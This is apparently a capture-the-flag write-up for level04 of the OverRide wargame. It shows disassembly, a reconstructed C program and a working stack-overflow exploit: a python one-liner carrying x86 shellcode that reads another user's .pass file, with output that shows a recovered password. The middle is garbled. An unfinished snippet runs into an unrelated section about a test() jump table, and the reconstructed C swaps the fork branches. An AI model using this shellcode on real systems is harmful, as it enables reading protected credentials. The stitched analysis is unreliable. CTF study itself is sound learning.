# level04 - Stack Buffer Overflow

On `level04`'s HOME, we find a binary named : `level04`

```shell
...
0x080486c8  main
...
```


```shell
gefâž¤  disass main
Dump of assembler code for function main:
   0x080486c8 <+0>:	push   ebp
   0x080486c9 <+1>:	mov    ebp,esp
   0x080486cb <+3>:	push   edi
   0x080486cc <+4>:	push   ebx
   0x080486cd <+5>:	and    esp,0xfffffff0
   0x080486d0 <+8>:	sub    esp,0xb0
   0x080486d6 <+14>:	call   0x8048550 <fork@plt>
   0x080486db <+19>:	mov    DWORD PTR [esp+0xac],eax
   0x080486e2 <+26>:	lea    ebx,[esp+0x20]
   0x080486e6 <+30>:	mov    eax,0x0
   0x080486eb <+35>:	mov    edx,0x20
   0x080486f0 <+40>:	mov    edi,ebx
   0x080486f2 <+42>:	mov    ecx,edx
   0x080486f4 <+44>:	rep stos DWORD PTR es:[edi],eax
   0x080486f6 <+46>:	mov    DWORD PTR [esp+0xa8],0x0
   0x08048701 <+57>:	mov    DWORD PTR [esp+0x1c],0x0
   0x08048709 <+65>:	cmp    DWORD PTR [esp+0xac],0x0
   0x08048711 <+73>:	jne    0x8048769 <main+161>
   0x08048713 <+75>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804871b <+83>:	mov    DWORD PTR [esp],0x1
   0x08048722 <+90>:	call   0x8048540 <prctl@plt>
   0x08048727 <+95>:	mov    DWORD PTR [esp+0xc],0x0
   0x0804872f <+103>:	mov    DWORD PTR [esp+0x8],0x0
   0x08048737 <+111>:	mov    DWORD PTR [esp+0x4],0x0
   0x0804873f <+119>:	mov    DWORD PTR [esp],0x0
   0x08048746 <+126>:	call   0x8048570 <ptrace@plt>
   0x0804874b <+131>:	mov    DWORD PTR [esp],0x8048903
   0x08048752 <+138>:	call   0x8048500 <puts@plt>
   0x08048757 <+143>:	lea    eax,[esp+0x20]
   0x0804875b <+147>:	mov    DWORD PTR [esp],eax
   0x0804875e <+150>:	call   0x80484b0 <gets@plt>
   0x08048763 <+155>:	jmp    0x804881a <main+338>
   0x08048768 <+160>:	nop
   0x08048769 <+161>:	lea    eax,[esp+0x1c]
   0x0804876d <+165>:	mov    DWORD PTR [esp],eax
   0x08048770 <+168>:	call   0x80484f0 <wait@plt>
   0x08048775 <+173>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048779 <+177>:	mov    DWORD PTR [esp+0xa0],eax
   0x08048780 <+184>:	mov    eax,DWORD PTR [esp+0xa0]
   0x08048787 <+191>:	and    eax,0x7f
   0x0804878a <+194>:	test   eax,eax
   0x0804878c <+196>:	je     0x80487ac <main+228>
   0x0804878e <+198>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048792 <+202>:	mov    DWORD PTR [esp+0xa4],eax
   0x08048799 <+209>:	mov    eax,DWORD PTR [esp+0xa4]
   0x080487a0 <+216>:	and    eax,0x7f
   0x080487a3 <+219>:	add    eax,0x1
   0x080487a6 <+222>:	sar    al,1
   0x080487a8 <+224>:	test   al,al
   0x080487aa <+226>:	jle    0x80487ba <main+242>
   0x080487ac <+228>:	mov    DWORD PTR [esp],0x804891d
   0x080487b3 <+235>:	call   0x8048500 <puts@plt>
   0x080487b8 <+240>:	jmp    0x804881a <main+338>
   0x080487ba <+242>:	mov    DWORD PTR [esp+0xc],0x0
   0x080487c2 <+250>:	mov    DWORD PTR [esp+0x8],0x2c
   0x080487ca <+258>:	mov    eax,DWORD PTR [esp+0xac]
   0x080487d1 <+265>:	mov    DWORD PTR [esp+0x4],eax
   0x080487d5 <+269>:	mov    DWORD PTR [esp],0x3
   0x080487dc <+276>:	call   0x8048570 <ptrace@plt>
   0x080487e1 <+281>:	mov    DWORD PTR [esp+0xa8],eax
   0x080487e8 <+288>:	cmp    DWORD PTR [esp+0xa8],0xb
   0x080487f0 <+296>:	jne    0x8048768 <main+160>
   0x080487f6 <+302>:	mov    DWORD PTR [esp],0x8048931
   0x080487fd <+309>:	call   0x8048500 <puts@plt>
   0x08048802 <+314>:	mov    DWORD PTR [esp+0x4],0x9
   0x0804880a <+322>:	mov    eax,DWORD PTR [esp+0xac]
   0x08048811 <+329>:	mov    DWORD PTR [esp],eax
   0x08048814 <+332>:	call   0x8048520 <kill@plt>
   0x08048819 <+337>:	nop
   0x0804881a <+338>:	mov    eax,0x0
   0x0804881f <+343>:	lea    esp,[ebp-0x8]
   0x08048822 <+346>:	pop    ebx
   0x08048823 <+347>:	pop    edi
   0x08048824 <+348>:	pop    ebp
   0x08048825 <+349>:	ret
End of assembler dump.
```

<br>

After decompiling it using gdb, we build this code in C language:

```c
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <sys/types.h>
# include <sys/wait.h>
# include <unistd.h>
# include <sys/prctl.h>
# include <sys/ptrace.h>


int main(void) {

	int		*wstatus = NULL; // esp+0x1c
	char	str[32]; // esp+0x20
	int		tmp;	// esp+0xa8
	pid_t	pid; // esp+0xac

	for ( int i = 0; i < 32; i++ )
		str[i] = '\0';

	pid = fork();

	if ( pid ) {
		prctl( 1, 1 );
		ptrace( PTRACE_TRACEME, 0, NULL, NULL );
		puts( "Give me some shellcode, k" );
		gets( str );
	} else {

		while (1) {
			wait( wstatus );
			if ( *wstatus & 127 == 0 ) {
				if ( (*wstatus & 127) >> 1 == 0 ) {
					if ( ptrace(PTRACE_PEEKDATA, pid, 0x2c, NULL) == 0xb ) {
						puts("no exec() for you");
						kill(pid, 9);
						break;
					}
				}
			} else {
				puts( "child is exiting..." );
				break;
			}
		}

	}

	return 0;

}
```

From the assembly code and its transciption into C, we understand that we have
a buffer overflow vulnerability in the child process code (`gets( str );`),
so we can easily inject our shellcode into the buffer on the stack.
But there's one thing: we can't use functions from the `exec()` family to do this...
no problem, we'll write a shellcode that will allow us to read directly from the file
and write the result to stdout. Let's build it.

<br>

This is our crafted shellcode from this snippet:

```
in fd = open("////home/users/level05/.pass", O_RDONLY);
read(fd, );

<br>

First, from the `test()` function, we can see that the input number we wrote is
substract from the number **322424845** and the result have to be less than or equal
to **21** (the result is not signed, so it is also greater than or equal to zero):

```assembly
   0x0804875c <+21>:	cmp    DWORD PTR [ebp-0xc],0x15
```

```c
void decrypt(int nb) {
...
	if ( (i = (unsigned int)(nb - pass)) > 21 ) {
...
```

So, the right number is in range **[322424824 - 322424845]**

<br>

Then, in the assembler code, we can see that the difference between these two
numbers (322424845 and our input) is multiplied by 4 and used as an offset from
address *0x80489f0* to select the address we're going to jump to. From now we
will call it **the offset**:

```assembly
...
   0x08048766 <+31>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048769 <+34>:	shl    eax,0x2
   0x0804876c <+37>:	add    eax,0x80489f0
   0x08048771 <+42>:	mov    eax,DWORD PTR [eax]
   0x08048773 <+44>:	jmp    eax
...
```

Let's look all possibilities we have (remember, there are 21 possibilities !) to
set **the offset**:

```shell
(gdb)  x/24wx 0x80489f0
   0x80489f0:	0x0804884a	0x08048775	0x08048785	0x08048795
   0x8048a00:	0x080487a5	0x080487b5	0x080487c5	0x080487d5
   0x8048a10:	0x080487e2	0x080487ef	0x0804884a	0x0804884a
   0x8048a20:	0x0804884a	0x0804884a	0x0804884a	0x0804884a
   0x8048a30:	0x080487fc	0x08048809	0x08048816	0x08048823
   0x8048a40:	0x08048830	0x0804883d	0x2a2a2a2a	0x2a2a2a2a
(gdb) set $addr = 0x80489f0
(gdb) while $addr <= 0x8048a44
> x/x *$addr
> set $addr = $addr + 4
> end
   0x804884a <test+259>:	0xfffcd1e8
   0x8048775 <test+46>:	0x89f4458b
   0x8048785 <test+62>:	0x89f4458b
   0x8048795 <test+78>:	0x89f4458b
   0x80487a5 <test+94>:	0x89f4458b
   0x80487b5 <test+110>:	0x89f4458b
   0x80487c5 <test+126>:	0x89f4458b
   0x80487d5 <test+142>:	0x89f4458b
   0x80487e2 <test+155>:	0x89f4458b
   0x80487ef <test+168>:	0x89f4458b
   0x804884a <test+259>:	0xfffcd1e8
   0x804884a <test+259>:	0xfffcd1e8
   0x804884a <test+259>:	0xfffcd1e8
   0x804884a <test+259>:	0xfffcd1e8
   0x804884a <test+259>:	0xfffcd1e8
   0x804884a <test+259>:	0xfffcd1e8
   0x80487fc <test+181>:	0x89f4458b
   0x8048809 <test+194>:	0x89f4458b
   0x8048816 <test+207>:	0x89f4458b
   0x8048823 <test+220>:	0x89f4458b
   0x8048830 <test+233>:	0x89f4458b
   0x804883d <test+246>:	0x89f4458b
```

So, from gdb, we see that **the offset** need to be in range **[0-9,16-21]**

<br>



<br>

We can now exploit this BOF :

```shell
python -c 'print "\x90" * 41 + "\x31\xdb\x53\xbb\x70\x61\x73\x73\x53\xbb\x30\x35\x2f\x2e\x53\xbb\x65\x76\x65\x6c\x53\xbb\x72\x73\x2f\x6c\x53\xbb\x2f\x75\x73\x65\x53\xbb\x68\x6f\x6d\x65\x53\xbb\x2f\x2f\x2f\x2f\x53\x31\xc0\x31\xd2\xb0\x05\x89\xe3\x31\xc9\x66\xba\x84\x02\xcd\x80\x31\xdb\x31\xd2\x88\xc3\x89\xe1\xb0\x03\xb2\x2a\xcd\x80\xb0\x04\xb3\x01\xb2\x29\xcd\x80" + "\x90" * 32 + "\xff\xff\xd6\x90"[::-1]' | ./level04
```


```shell
level04@OverRide:~$ python -c 'print "\x90" * 41 + "\x31\xdb\x53\xbb\x70\x61\x73\x73\x53\xbb\x30\x35\x2f\x2e\x53\xbb\x65\x76\x65\x6c\x53\xbb\x72\x73\x2f\x6c\x53\xbb\x2f\x75\x73\x65\x53\xbb\x68\x6f\x6d\x65\x53\xbb\x2f\x2f\x2f\x2f\x53\x31\xc0\x31\xd2\xb0\x05\x89\xe3\x31\xc9\x66\xba\x84\x02\xcd\x80\x31\xdb\x31\xd2\x88\xc3\x89\xe1\xb0\x03\xb2\x2a\xcd\x80\xb0\x04\xb3\x01\xb2\x29\xcd\x80" + "\x90" * 32 + "\xff\xff\xd6\x90"[::-1]' | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
